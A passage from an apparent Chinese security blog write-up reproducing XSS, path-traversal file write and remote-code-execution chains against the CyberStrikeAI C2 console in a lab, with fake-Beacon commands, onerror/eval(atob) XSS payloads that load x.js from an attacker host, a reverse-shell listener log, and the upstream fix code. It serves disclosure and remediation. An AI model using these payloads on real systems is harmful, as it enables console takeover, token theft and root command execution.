0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><strong style="color: #0A0A0A;font-weight: 700;"><span leaf="">不存在</span></strong></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">父目录不存在，写入静默失败，接口仍返回 ok</span></section></td></tr></tbody></table>  
  
  
最后一行那个文件没有落地，而接口返回的还是 {"ok":"1"}  
——排查的时候如果只看接口响应会误判。  
  
最有意思的是第四行。文件被写进了 C2 控制台自己的静态资源目录，Web 服务直接把内容下发：  
```
$ curl http://127.0.0.1:8080/static/pwned_by_result.jsalert('pwned by /result arbitrary file write');
```  
  
也就是说**任意文件写入 + 控制台静态目录 = 在 C2 控制台自身源上植入脚本**  
。相比 XSS 链，这条路连管理员都不用点任何东西，只要控制台加载到这个 JS 就会执行。同源域下，管理员的 Token 唾手可得。![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSbR0YuJUM1r66ic2xdGvXAibwicXKVCdiaia2ESCT55AX5G4B0GYWYSFtYcQG78icrIMmEhibAxEvqqvdbohuMu6CxruC3dAxHJCTalf0/640?wx_fmt=png&from=appmsg "")  
  
### 5.7 文件名注入路径  
```
python3 fake_beacon.py --server http://127.0.0.1:9001 --token <TOKEN> --xss-file
```  
  
假 Beacon 在回复 ls  
 任务时，把恶意文件名塞进结构化输出的第 4 段（type\tmode\tsize\tname  
）：  
```
f  -rw-r--r--  1024  x'><img src=x onerror=alert(document.cookie) width=0 height=0>
```  
  
管理员点开 Files 标签页，弹窗照样触发：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSbF2v2xe1eB2xBkuB6oVkviaZUeKKmJsy54IM0ADHibYiaIKQCk6Q3Cw7H3sksgzwBQGkbJhuIZb2j2vvBLA9lO0jpPxibAUWC41Rs/640?wx_fmt=png&from=appmsg "")  
  
  
文件列表渲染出来是这样：![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSZIpKcZQj2ibmR3mfQG6JicnGOsH3tglibCThGWE6mKuOYOYCibsXGd6QgjdW7Zo5zAibWAGsFANLLANhVExh05SRibaZ1Oe39zIdYOg/640?wx_fmt=png&from=appmsg "")  
  
  
注意右下角那个 Download 按钮，显示成了 ">Download  
。这正是单引号属性被闭合、>  
 提前结束 button 标签留下的残留——**属性边界突破在 UI 上是肉眼可见的**  
。![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSY6fiaq4nicgPtfcl3Wu3GRyJ5LpOYGUyPJhLCA6MkicoQMqquKWmMSnysBPCxY7sewO8WhaAzZXI2HA722QTH5TYJoaYWibHPZ4Lo/640?wx_fmt=png&from=appmsg "")  
  
### 5.8 用平台自己的终端坐实"主控端本地执行"  
  
前面所有结论都是用我自己写的 PoC 脚本验的，读者难免怀疑"反弹 shell 到底打到了哪台机器"。这里换一种验法：**用平台自带的终端功能**  
。（把两台机器真正拆开之后的版本见 5.11 节，那一节的地址和路径都是分开跑的。）  
  
C2 控制台里有个「设置 → 终端」，页面上的说明写着 "Run commands on the server for ops and debugging. Commands run on the server."。这个终端走 /api/terminal/ws  
（internal/handler/terminal_ws_unix.go  
），服务端用 PTY 起一个交互式 bash —— 就在 **C2 主控端进程里**  
。  
  
在里面敲几条命令：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSbicE6mreqCFBicYVsfRROtzsXZ7eoQv1mxicDpLbicwG1CXAuL4XYSF3WTEic8aBsicXHBbU8cBE2vm7nkraZSwAqjKnzjib908rBwMg/640?wx_fmt=png&from=appmsg "")  
  
```
root@cloud-compute-new-47ncn:/workspace/work/run# whoamirootroot@cloud-compute-new-47ncn:/workspace/work/run# pwd/workspace/work/runroot@cloud-compute-new-47ncn:/workspace/work/run# ls -la /workspace/work/run/pwned_by_result.sh /workspace/work/run/web/static/pwned_by_result.js-rw-r--r-- 1 root root 61 Oct 29 12:48 /workspace/work/run/pwned_by_result.sh-rw-r--r-- 1 root root 48 Oct 29 12:48 /workspace/work/run/web/static/pwned_by_result.jsroot@cloud-compute-new-47ncn:/workspace/work/run# cat /workspace/work/run/web/static/pwned_by_result.jsalert('pwned by /result arbitrary file write');
```  
  
pwd  
 是 /workspace/work/run  
——**C2 主控端进程的工作目录**  
。ls  
 出来的两个文件正是 5.6 节用 /result  
 穿越写进去的，内容一字不差。  
  
也就是说：任意文件写入的目标磁盘，和 /api/terminal/*  
 执行的 shell，是**同一台机器**  
。这一条链路没有歧义。  
  
完整会话记录（抓 WebSocket 帧还原）：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSZowRycrYw0ubxoxMb4FsiaJrMaL9s7KUMpKiaur44rguFhUOYeGl7X2V184DALA8hxxWVPS7KicczXdLibt0Mcibk2DdOmXr7SwC74/640?wx_fmt=png&from=appmsg "")  
  
  
顺手把 results  
 目录也列了一下，可以看到那个**没有穿越成功**  
的 ./  
 形式落成了 t_95fbcbb7db6343.  
 这个带尾点的普通文件：  
```
root@cloud-compute-new-47ncn:/workspace/work/run# ls -la /workspace/work/run/tmp/c2/results/total 9drwxr-xr-x 2 root root 4096 Oct 29 12:48 .drwxr-xr-x 3 root root 4096 Oct 29 09:11 ..-rw-r--r-- 1 root root   12 Oct 29 09:33 t_2bd3cfc2ede64d.-rw-r--r-- 1 root root   12 Oct 29 12:48 t_95fbcbb7db6343.
```  
### 5.9 绕过 Web 层直查数据库  
  
存储型 XSS 的定义就是 payload 进了数据库。这一步直接用 sqlite3 打开 C2 主控端的库文件查：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSZBkuzjzVVdgD3B2JB7MYiahnKFdvOQzMiatdv4CtJk9Jnaicc8lBdhqdF2ciabMvDDYeWa1lOTlyXHJQRiciauCX3DjMgWQgnWPF8hk/640?wx_fmt=png&from=appmsg "")  
  
  
c2_sessions.implant_uuid  
 字段里就是完整的 payload：  
```
session_id   : s_bdd7568b361d43implant_uuid : x"><img src=x onerror=eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7...')) width=0 height=0>internal_ip  : 10.0.0.5hostname     : dc-02-web-01   username=root
```  
  
从写入到渲染到执行，三段证据就闭环了：数据库里有 → 管理界面渲染出来触发 → 同源页面用管理员 Token 调通了终端接口。  
### 5.10 一个容易搞混的地方  
  
C2 会话详情里也有一个「Terminal」标签页，但它和「设置 → 终端」**不是一回事**  
：  
  
  
<table><thead><tr style="border-top: none;background-color: #FFFFFF;"><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf=""><br/></span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">「C2 → 会话 → Terminal」标签页</span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">「设置 → 终端」</span></section></th></tr></thead><tbody><tr style="border-top: none;background-color: #FFFFFF;"><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">实现</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">POST /api/c2/tasks</span></code><section><span leaf="">，</span><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">task_type=shell</span></code></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">GET /api/terminal/ws</span></code></td></tr><tr style="border-top: none;background-color: #FAFAFA;"><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">命令跑在哪</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><strong style="color: #0A0A0A;font-weight: 700;"><span leaf="">被控端</span></strong><section><span leaf="">（作为任务下发给 Beacon）</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><strong style="color: #0A0A0A;font-weight: 700;"><span leaf="">C2 主控端</span></strong><section><span leaf="">（服务端本地 PTY）</span></section></td></tr><tr style="border-top: none;background-color: #FFFFFF;"><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">代码位置</span></section></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">web/static/js/c2.js:2019</span></code><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">runTerminalCommand</span></code></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">web/static/js/terminal.js:115</span></code><section><span leaf=""> → </span><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">internal/handler/terminal_ws_unix.go</span></code></section></td></tr></tbody></table>  
  
  
我一开始也以为会话里的 Terminal 标签页是本地 shell，实测才发现它下发的是 shell  
 任务，命令是发给被控端执行的（假 Beacon 不回这个任务，终端就一直卡在 "Please wait for the current command to finish"）。  
  
**这条区分对写 PoC 很重要**  
：XSS 走的是 /api/terminal/run  
，那个才是主控端本地的执行原语；会话 Terminal 标签页是下发通道，压根不是攻击面。  
### 5.11 把攻击端和被攻击端真的拆成两台机器  
  
前面所有复现都在一台机器的 127.0.0.1 上跑完。读者看图时难免要问一句：**反弹 shell 到底连到了哪台机器？写进去的文件到底落在谁的磁盘上？**  
  
这一节用 Linux network namespace 把两边真的拆开。  
  
沙箱里没有 CAP_NET_ADMIN  
，不能直接建 netns 和 veth。但 **user namespace + network namespace 的组合可以用**  
：  
```
$ unshare -Urn echo "userns+netns OK"userns+netns OK
```  
  
在 user namespace 里拿到的是该 namespace 内的全部能力，包括对自己创建的 netns 的 CAP_NET_ADMIN  
。于是可以建出这样一张图：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSaut8aic1zTNHFYYS4giacrfy9x1BeTHtwzS4TTiav6o9LSQBvmwv1BUtMKkRp245BuibsDGnEaH9jxtZm6Qdx0QrKLyAh6LLmSmSM/640?wx_fmt=png&from=appmsg "")  
  
  
  
<table><thead><tr style="border-top: none;background-color: #FFFFFF;"><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">角色</span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">netns</span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">地址</span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">跑的东西</span></section></th></tr></thead><tbody><tr style="border-top: none;background-color: #FFFFFF;"><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">受害者</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">A</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">10.10.10.1</span></code><section><span leaf="">（Beacon listener）/ </span><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">10.10.11.1</span></code><span leaf="">（Web 控制台）</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">C2 主控端 + 管理员浏览器 + 报文记录代理</span></section></td></tr><tr style="border-top: none;background-color: #FAFAFA;"><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">攻击者</span></section></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">B</span></section></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">10.10.10.2</span></code></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">假 Beacon、x.js 托管、反弹 shell 监听、</span><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">/result</span></code><span leaf=""> 写入</span></section></td></tr></tbody></table>  
  
  
两侧各有一张独立路由表，路由只有一条 10.10.10.0/24  
，唯一的通路就是那对 veth。跨网 ping 双向通。  
  
这是两边的原始 ip addr  
 / ip route  
 / ping  
 输出：![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSYqasj35CpThENIkM0EDe7OzmCXEJWEQc0g6FSzAWXjJbI8Lgq4uicbVRdHZQ5HIAekzVLPEtGB3fAJk0eiaYd9MkzsDwhFjsbgc/640?wx_fmt=png&from=appmsg "")  
  
> 踩坑记录：在这个沙箱里，**「本机 → 本机的 veth 地址」这条路走不通**  
，本地投递会一直超时；把地址挂到 lo  
 上就正常。所以受害者侧多挂了一个 10.10.11.1/32  
 的 lo 别名给本机浏览器用，Beacon listener 仍然绑在 10.10.10.1  
 上，让攻击者从另一侧访问。  
  
#### 文件级隔离  
  
netns 只隔离网络。文件层面我在攻击者侧再加了一个 mount namespace，用空 tmpfs 把受害者目录整个盖住：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSYyy3V5501R7tZjpu03t6VCrOWXyd8oskQk25qphHlAEXYK0RIdKJNOx6MtDjcB13s4CyxM1QzTrvaqDoATDkLPh7WWgYHUwAw/640?wx_fmt=png&from=appmsg "")  
  
  
攻击者 ls  
 受害者的目录是空的，cat  
 受害者的 SQLite 库直接报 No such file。也就是说**攻击者除了 C2 的 HTTP API 之外，没有任何别的入口**  
——它能做的所有事情，都必须走协议。  
#### 跨网证据  
  
**一、受害者的浏览器去攻击机上取 x.js。**  
 攻击机 HTTP 服务的访问日志里，客户端地址就是受害者：![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSa3sEJibAjp4CDjjRKsmkiaVxyicAqF85BnjDN7E62cu31J5IzXicXwy86rj619sLayWs9rC2uQpKcx2pI2zHiayVzMVUofawuvibo9A/640?wx_fmt=png&from=appmsg "")  
  
```
10.10.10.1 - - [29/Oct/2026 15:02:03] "GET /x.js HTTP/1.1" 200 -
```  
  
**二、反弹 shell 是从受害者连过来的。**  
 攻击机监听在 10.10.10.2:9999  
，连接来源显示 10.10.10.1  
：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSYoRb6ZfCibnJs47BOwpQhss9RmzOlOt8oqUlHicVDUJvTsphZd73lIQTCgCvfrUpGmmKVEIcoeWVOBGzmJiccu6M3kvicxfmS1Wm4/640?wx_fmt=png&from=appmsg "")  
  
```
listening on [10.10.10.2]:9999 ...connect to [10.10.10.2] from (UNKNOWN) [10.10.10.1] 50320root@cloud-compute-new-stjcr:/workspace/work/lab/victim# pwd/workspace/work/lab/victim
```  
  
注意 shell 的工作目录是 /workspace/work/lab/victim  
 —— **C2 主控端进程的 cwd**  
，不是攻击者的。  
  
**三、原始 HTTP 报文里 Host 是受害者地址。**  
![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSbe3uPAPj1EcHnO0U0gkjnw5wBKUiaibdPfK52dcQ6jcI31DRknsAWjGicK34psBD2QpLuoAEwt0wOb98u6dQ7AA3A91BgQNK7F0I/640?wx_fmt=png&from=appmsg "")  
  
```
POST /check_in HTTP/1.1Host: 10.10.10.1:9002X-Implant-Token: N-mRrLQBBHhAA54YF_vPB4tTcQKSrtljAl7fjfr8LQA...{"uuid": "x\"><img src=x onerror=eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7...')) width=0 height=0>", ...}
```  
  
**四、文件写入落在受害者的磁盘上。**  
 攻击者从 B 网段打 /result  
，受害者用自己的平台终端核对：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSbd0ujQKjticO6h5B8KmYb0lWZAYHEn9J3nDohhqTkKgrDdWu3ia9abnEiaH2SLYTOvEeJd9jU5JC80k2y8KXPicFEVnWJgdQU6Byc/640?wx_fmt=png&from=appmsg "")  
  
  
受害者侧「设置 → 终端」看到的：![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSZdKicmKaAVsiaFg5oNYQRodGl3EuAfqs6SxoszficiaRrpsZl61mf2XHFVciczxnQxP5cBKCx0ibxoib0LPdliaern5kZwSibccsM8ZeXw/640?wx_fmt=png&from=appmsg "")  
  
```
root@cloud-compute-new-stjcr:/workspace/work/lab/victim# pwd/workspace/work/lab/victimroot@cloud-compute-new-stjcr:/workspace/work/lab/victim# ls -la ./pwned_by_result.sh ./web/static/pwned_by_result.js-rw-r--r-- 1 root root 61 Oct 29 15:03 ./pwned_by_result.sh-rw-r--r-- 1 root root 48 Oct 29 15:03 ./web/static/pwned_by_result.jsroot@cloud-compute-new-stjcr:/workspace/work/lab/victim# cat ./web/static/pwned_by_result.jsalert('pwned by /result arbitrary file write');
```  
  
写入方在 10.10.10.2  
，文件在 10.10.10.1  
 的磁盘上，两个进程的 cwd 也都对得上。  
  
至于 task_id  
，是假 Beacon 通过正常的 /tasks  
 协议拿到的（管理员打开会话详情时，服务端会给这个会话下发一个 ls  
 任务）——**这正是真实被控端获取任务 ID 的路径**  
，没有走任何后门。  
## 六、实测下来几个需要修正的点  
  
这几条和公开 PoC 的描述不一致，是我实际跑出来对不上的地方：  
1. 1  
**alert(document.cookie) 弹的是空字符串。**  
 平台的认证 Token 只存在 localStorage（auth.js:29  
），不走 Cookie。想拿 Token 必须读 localStorage['cyberstrike-auth']  
。  
  
1. 2  
**blob_suffix 用一串 ./ 跳不出目录。**filepath.Join  
 的 Clean  
 会把 ./  
 全部规范化掉，等价于给 taskID 后面加了个 .  
。能穿越的形态必须以 /  
 开头。  
  
1. 3  
**父目录不存在时写入静默失败。**saveResultBlob  
 只 MkdirAll  
 了 results 目录，穿越目标路径的父目录不存在就直接 ENOENT，而 IngestTaskResult  
 只记一条 warn，接口照样返回 {"ok":"1"}  
。  
  
1. 4  
**XSS 不需要管理员点击会话卡片。**c2.js:1486-1489  
 会自动选中列表第一条会话并渲染详情，最新的假 Beacon 正好排在最前面，打开页面就中招。  
  
1. 5  
**/check_in 同样有明文 JSON 回退。**  
 所以假 Beacon 只需要监听器 Token，AES Key 可选。原文写的「需要从 Beacon 提取 Token + AES Key」，实际只要 Token。  
  
1. 6  
**C2 控制台没有 CSP。**  
 外部 <script src>  
 加载不受任何限制。  
  
1. 7  
**原文「相关文件」清单里的 vuln-poc/ 目录，在仓库里并不存在。**  
 我把 v1.7.11  
 和 main  
 两个 tag 都翻了一遍：  
  
```
$ ls -d vuln-poc                       # v1.7.11ls: cannot access 'vuln-poc': No such file or directory$ ls -d CyberStrikeAI-main/vuln-poc   # mainls: cannot access 'CyberStrikeAI-main/vuln-poc': No such file or directory
```  
  
原文引用了 vuln-poc/fake_beacon.py  
 第 298-315 行、vuln-poc/extract_beacon_config.py  
、vuln-poc/B2.1-xss-rce-chain/x.js  
 第 28-104 行，还给了精确行号，但这些文件两个分支都没有。可能是作者本地有但没 push，也可能引的是私有仓库。  
  
不影响漏洞本身的成立——**代码层面的根因（c2.js:481、c2.js:2788-2789、manager.go:750、listener_http.go:300）是仓库里实打实的代码**  
，行号我逐个核对过。但引用一个读者拿不到的文件做 PoC 说明，对复现者不友好。  
  
本文的 PoC 全部是我读完 Go 源码后自己写的，vuln-poc/  
 里的东西一行都没用。  
## 七、影响面  
  
<table><thead><tr style="border-top: none;background-color: #FFFFFF;"><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">维度</span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">影响</span></section></th></tr></thead><tbody><tr style="border-top: none;background-color: #FFFFFF;"><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">机密性</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">窃取管理员 Token，接管整个 C2 平台；平台里保存着所有 Beacon 配置、Token、AES Key、数据库凭据</span></section></td></tr><tr style="border-top: none;background-color: #FAFAFA;"><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">完整性</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">通过 </span><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">/api/terminal/run</span></code><span leaf=""> 任意操控主控端文件系统；通过 </span><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">/result</span></code><span leaf=""> 向任意路径写任意后缀的文件</span></section></td></tr><tr style="border-top: none;background-color: #FFFFFF;"><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">可用性</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">覆盖关键文件导致 C2 服务崩溃；写入伪造配置篡改下发逻辑</span></section></td></tr><tr style="border-top: none;background-color: #FAFAFA;"><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">RCE</span></section></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">两条路径都能在 C2 主控端拿到 root shell</span></section></td></tr></tbody></table>  
  
  
需要的前置条件只有两个：**监听器 Token**  
（从任一 Beacon 二进制提取，监听器级别共享）和 **C2 主控端能连到攻击机**  
（外网 JS 托管 + 反连端口）。AES Key 不需要，管理员主动点击也不需要。  
## 八、修复  
  
我对比了 main  
 分支（v1.7.24）的代码，三处都改到位了。  
  
**前端：不再拼 inline onclick**  
，改成 data-*  
 属性 + 事件委托，同时补了一个 escapeAttr()  
 专治属性上下文：  
```
// main: web/static/js/c2.js:641-643function escapeAttr(text) {    return escapeHtml(text).replace(/"/g, '&quot;').replace(/'/g, '&#39;');}// main: web/static/js/c2.js:481 —— 渲染处? `<button type="button" class="c2-session-info-copy"     title="${escapeAttr(c2t('c2.sessions.infoCopy'))}" aria-label="${escapeAttr(...)}"     data-c2-copy-value="${escapeAttr(String(value))}">// main: web/static/js/c2.js:2886 —— 文件列表data-c2-file-action="${entry.isDir ? 'open' : 'download'}"data-c2-file-name="${escapeAttr(entry.name)}"// main: web/static/js/c2.js:665-688 —— 事件委托function bindC2SafeActionDelegation() {    document.addEventListener('click', function(e) {        const copyBtn = e.target.closest('[data-c2-copy-value]');        if (copyBtn) {            C2.copyText(copyBtn.getAttribute('data-c2-copy-value') || '');            return;        }        const fileBtn = e.target.closest('[data-c2-file-action]');        if (fileBtn) {            const name = fileBtn.getAttribute('data-c2-file-name') || '';            const action = fileBtn.getAttribute('data-c2-file-action');            if (action === 'open') C2.openDirectory(name);            else if (action === 'download') C2.downloadFile(name);            return;        }    });}
```  
  
值走 getAttribute  
 拿，永远不进 HTML 解析器；就算将来有人再写回属性，也有一层 escapeAttr  
 兜底。注入点从根上消失。  
  
**后端：明文回退删掉**  
，解密失败直接拒：  
```
// main: internal/c2/listener_http.go:298-302plaintext, decErr := DecryptAESGCM(l.rec.EncryptionKey, string(body))if decErr != nil {    l.disguisedReject(w)    return}
```  
  
同时补上了任务存在性和会话归属校验（authenticatesSession  
）。  
  
**落盘：后缀白名单 + 目录边界检查**  
：  
```
// main: internal/c2/manager.go:46resultBlobSuffixPattern = regexp.MustCompile(`^\.[A-Za-z0-9][A-Za-z0-9_-]{0,31}$`)// main: internal/c2/manager.go:840-871func normalizeResultBlobSuffix(suffix string) (string, error) {    ...    if !resultBlobSuffixPattern.MatchString(suffix) {        return "", fmt.Errorf("invalid blob suffix")    }    return suffix, nil}func ensurePathInDir(dir, path string)error {    ...    rel, err := filepath.Rel(absDir, absPath)    if rel == "." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) ||       rel == ".." || filepath.IsAbs(rel) {        return fmt.Errorf("path escapes result directory")    }    return nil}
```  
  
saveResultBlob  
 里还额外校验了 taskID 不含 /  
、\  
、..  
。  
  
本文所有结论均基于 v1.7.11 源码审计与本地环境实测，未在未授权的目标上验证。相关漏洞已由作者在最新版本修复，请及时升级。  
- 📄往期推荐：  
  
- [PHP2Shell 漏洞分析与复现：CVE-2026-109618 / CVE-2026-109619 未认证远程代码执行](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247491824&idx=1&sn=3403098e924463ec3d9ae057f3322ceb&scene=21#wechat_redirect)  
  
  
- [CVE-2026-73570：Zimbra 未授权命令注入漏洞分析—SMTP 日志投毒实现 RCE](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247491799&idx=1&sn=d23aa63985ca0b372e0381f603dd58e3&scene=21#wechat_redirect)  
  
  
